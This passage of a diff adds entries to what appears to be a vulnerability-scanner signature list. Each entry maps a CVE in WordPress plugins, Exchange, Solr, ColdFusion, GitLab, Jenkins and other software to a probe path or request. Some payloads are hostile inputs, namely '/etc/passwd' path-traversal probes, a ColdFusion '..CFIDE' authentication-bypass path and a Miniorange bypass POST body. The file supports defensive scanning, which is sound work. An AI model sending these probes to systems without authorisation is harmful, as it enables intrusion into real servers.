+            "path_contains": [
+              "users"
+            ],
+            "server": [
+              "apache"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_5932",
+          "name": "CVE-2024-5932 GiveWP - PHP Object Injection",
+          "payload": "/wp-json/wp/v2/give_forms/",
+          "description": "[Nuclei] GiveWP - PHP Object Injection",
+          "risk": "critical",
+          "cve": "CVE-2024-5932",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://plugins.trac.wordpress.org/browser/give/tags/3.12.0/includes/login-register.php#L235",
+          "applies_to": {
+            "path_contains": [
+              "wp-json"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_2437",
+          "name": "CVE-2023-2437 UserPro <= 5.1.1 - Authentication Bypass",
+          "payload": "/wp-content/plugins/userpro/css/userpro.min.css",
+          "description": "[Nuclei] UserPro <= 5.1.1 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2023-2437",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-2437",
+          "applies_to": {
+            "path_contains": [
+              "wp-content",
+              "plugins"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_2982",
+          "name": "CVE-2023-2982 Miniorange Social Login and Register <= 7.6.3 - Authentication Bypass",
+          "payload": "/",
+          "description": "[Nuclei] Miniorange Social Login and Register <= 7.6.3 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2023-2982",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-2982",
+          "applies_to": {
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "body": "option=moopenid&email=uzmpvjPBmwEO3tFXq0vlJg%3D%3D&appName=rlHeqZw2vrPzOiWWfCParA%3D%3D",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_3197",
+          "name": "CVE-2023-3197 WordPress MStore API <= 4.0.1 - Unauthenticated SQL Injection",
+          "payload": "/wp-json/api/flutter_multi_vendor/product-categories",
+          "description": "[Nuclei] WordPress MStore API <= 4.0.1 - Unauthenticated SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2023-3197",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-3197",
+          "applies_to": {
+            "path_contains": [
+              "wp-json"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          },
+          "headers": {
+            "Accept": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_28480",
+          "name": "CVE-2021-28480 Microsoft Exchange - Pre-Auth SSRF / ACL Bypass (ProxyNotFound)",
+          "payload": "/owa/",
+          "description": "[Nuclei] Microsoft Exchange - Pre-Auth SSRF / ACL Bypass (ProxyNotFound)",
+          "risk": "critical",
+          "cve": "CVE-2021-28480",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/cve-2021-28480",
+          "applies_to": {
+            "path_contains": [
+              "owa"
+            ],
+            "powered_by": [
+              "exchange"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_28481",
+          "name": "CVE-2021-28481 Microsoft Exchange - Pre-Auth SSRF / ACL Bypass (ProxyNotFound)",
+          "payload": "/owa/",
+          "description": "[Nuclei] Microsoft Exchange - Pre-Auth SSRF / ACL Bypass (ProxyNotFound)",
+          "risk": "critical",
+          "cve": "CVE-2021-28481",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/cve-2021-28481",
+          "applies_to": {
+            "path_contains": [
+              "owa"
+            ],
+            "powered_by": [
+              "exchange"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2019_0192",
+          "name": "CVE-2019-0192 Apache Solr - Deserialization of Untrusted Data",
+          "payload": "/solr/admin/cores?wt=json",
+          "description": "[Nuclei] Apache Solr - Deserialization of Untrusted Data",
+          "risk": "critical",
+          "cve": "CVE-2019-0192",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-0192",
+          "applies_to": {
+            "path_contains": [
+              "solr"
+            ],
+            "server": [
+              "apache"
+            ],
+            "powered_by": [
+              "solr"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2014_2323",
+          "name": "CVE-2014-2323 Lighttpd 1.4.34 SQL Injection and Path Traversal",
+          "payload": "/etc/passwd",
+          "description": "[Nuclei] Lighttpd 1.4.34 SQL Injection and Path Traversal",
+          "risk": "critical",
+          "cve": "CVE-2014-2323",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2014-2323",
+          "applies_to": {
+            "path_contains": [
+              "etc",
+              "passwd"
+            ],
+            "server": [
+              "lighttpd"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_27771",
+          "name": "CVE-2026-27771 Gitea Container Registry - Unauthorized Private Image Access",
+          "payload": "/v2/",
+          "description": "[Nuclei] Gitea Container Registry - Unauthorized Private Image Access",
+          "risk": "high",
+          "cve": "CVE-2026-27771",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://blog.gitea.com/release-of-1.26.2/",
+          "applies_to": {
+            "powered_by": [
+              "gitea"
+            ]
+          },
+          "headers": {
+            "Accept": "application/json"
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_44825",
+          "name": "CVE-2026-44825 Apache Solr 9.4.0-9.10.1 / 10.0.0 - Hardcoded Default Credentials",
+          "payload": "/solr/admin/info/system?wt=json",
+          "description": "[Nuclei] Apache Solr 9.4.0-9.10.1 / 10.0.0 - Hardcoded Default Credentials",
+          "risk": "high",
+          "cve": "CVE-2026-44825",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-44825",
+          "applies_to": {
+            "path_contains": [
+              "solr"
+            ],
+            "server": [
+              "apache"
+            ],
+            "powered_by": [
+              "solr"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_38819",
+          "name": "CVE-2024-38819 Spring Framework Path Traversal in Functional Web Frameworks",
+          "payload": "/etc/passwd",
+          "description": "[Nuclei] Spring Framework Path Traversal in Functional Web Frameworks",
+          "risk": "high",
+          "cve": "CVE-2024-38819",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-38819",
+          "applies_to": {
+            "path_contains": [
+              "etc",
+              "passwd"
+            ],
+            "powered_by": [
+              "spring",
+              "vmware"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_26347",
+          "name": "CVE-2023-26347 Adobe Coldfusion - Authentication Bypass",
+          "payload": "/hax/..CFIDE/adminapi/administrator.cfc?method=getBuildNumber&_cfclient=true",
+          "description": "[Nuclei] Adobe Coldfusion - Authentication Bypass",
+          "risk": "high",
+          "cve": "CVE-2023-26347",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-26347",
+          "applies_to": {
+            "path_contains": [
+              "hax",
+              "..cfide"
+            ],
+            "powered_by": [
+              "coldfusion"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_7028",
+          "name": "CVE-2023-7028 GitLab - Account Takeover via Password Reset",
+          "payload": "/users/sign_in",
+          "description": "[Nuclei] GitLab - Account Takeover via Password Reset",
+          "risk": "high",
+          "cve": "CVE-2023-7028",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/",
+          "applies_to": {
+            "path_contains": [
+              "users",
+              "sign_in"
+            ],
+            "powered_by": [
+              "gitlab"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2019_1003000",
+          "name": "CVE-2019-1003000 Jenkins Script Security Plugin <=1.49 - Sandbox Bypass",
+          "payload": "/login",
+          "description": "[Nuclei] Jenkins Script Security Plugin <=1.49 - Sandbox Bypass",
+          "risk": "high",
+          "cve": "CVE-2019-1003000",
+          "location": "path",
+          "param": "",
+          "method": "GET",
+          "reference": "https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266",
+          "applies_to": {
+            "powered_by": [
+              "jenkins"
+            ]
+          }
+        }
+      ]
     }
   ]
 }
